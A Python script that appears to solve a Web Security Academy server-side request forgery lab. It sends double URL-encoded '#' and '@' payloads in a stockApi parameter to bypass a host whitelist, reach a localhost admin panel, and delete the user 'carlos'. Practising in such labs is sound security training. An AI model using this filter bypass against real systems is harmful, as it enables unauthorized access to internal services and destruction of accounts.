import requests
from urllib.parse import urljoin



base_url = 'https://ac911f6b1f59361ac0f9a1c800b700bc.web-security-academy.net'


def url_encode_all(url: str) -> str:
    return ''.join("%{0:0>2}".format(format(ord(c), "x")) for c in url)


def do_request(endpoint: str) -> str:
    print(endpoint)
    data = {
            'stockApi': endpoint
            }
    response = requests.post(urljoin(base_url, '/product/stock'), data=data)
    return response.content.decode('utf-8')


# note the double url encoding

# discover endpoint
print(do_request('http://127.0.0.1' + url_encode_all('#') + '@stock.weliketoshop.net/admin'))
# remove request
print(do_request('http://127.0.0.1' + url_encode_all('#') + '@stock.weliketoshop.net/admin/delete?username=carlos'))
# check success
print(do_request('http://127.0.0.1' + url_encode_all('#') + '@stock.weliketoshop.net/admin'))
